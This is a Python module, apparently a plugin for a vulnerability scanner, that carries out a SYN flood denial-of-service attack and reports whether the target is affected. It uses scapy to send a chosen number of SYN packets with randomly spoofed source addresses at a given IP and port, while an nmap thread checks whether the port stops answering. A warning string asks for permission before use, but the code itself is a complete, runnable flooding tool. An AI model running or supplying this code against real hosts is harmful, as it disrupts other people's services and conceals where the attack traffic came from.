from scapy.layers.inet import IP, TCP
from scapy.all import *
import random
from nmap import PortScanner
import threading

service = ["any"]
args = ["ip", "port"]
RUN_DETAILS = {
    "title": "SYN Flood DoS Vulnerability Detection",
    "description": "Basic SYN Flood attack.\n"
                   "WARNING!!! DO NOT USE THIS ON ANY DEVICE YOU DO NOT HAVE PERMISSION TO. "
                   "IT CAN, AND WILL BE SEEN AS MALICIOUS\n"
                   "Through abuse of the TCP 3-way handshake and improperly configured firewalls,"
                   "mass amounts of dummy packets to attempt to crash or slow a host\n"
                   "This is a very basic version of DoS. For most networks and hosts, these will not be effective even "
                   "if they are not stopped",
    "services": ["tcp"],
    "args": ["ip", "port", "num_packets"],
}


def randomIP():
    ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
    return ip


def randInt():
    x = random.randint(1000, 9000)
    return x


def packet_build(ip, port):
    s_port = random.randint(1, 65535)
    s_seq = randInt()
    s_window = randInt()
    pack = IP(src=randomIP(), dst=ip) / TCP(sport=s_port, dport=port, flags="S", seq=s_seq, window=s_window) / Raw(
        b"D" * 1024)
    return pack


def flood_t(ip, port, num_packets):
    print("Starting DoS Attempt...")
    for total in range(0, num_packets):
        pack = packet_build(ip, port)

        send(pack, verbose=0, inter=0.001)


p = PortScanner()


def test(ip, port, t: Thread):
    global total_r
    global total_u
    global res_s
    res_s = []
    total_u = 0
    total_r = 0
    while t.is_alive():
        tcp_args = ' -p ' + str(port) + ' --max-retries 0 -Pn'
        r = p.scan(ip, arguments=tcp_args)
        res_s.append(r)
        if r['scan'][ip]['tcp'][port]["state"] != "open":
            total_u += 1
        else:
            total_r += 1


def run(run_args: list):
    thread_f = threading.Thread(target=flood_t, args=(run_args[0], run_args[1], int(run_args[2])))
    thread_t = threading.Thread(target=test, args=(run_args[0], run_args[1], thread_f))
    thread_f.start()
    thread_t.start()
    thread_f.join()
    thread_t.join()
    if total_u > 0:
        return (True, "Potentially Vulnerable. " + str(total_r) + " responses received, "
                + str(total_u) + " responses not received.")
    else:
        return (False, "Likely Not Vulnerable. " + str(total_r) + " responses received, "
                + str(total_u) + " responses not received.")


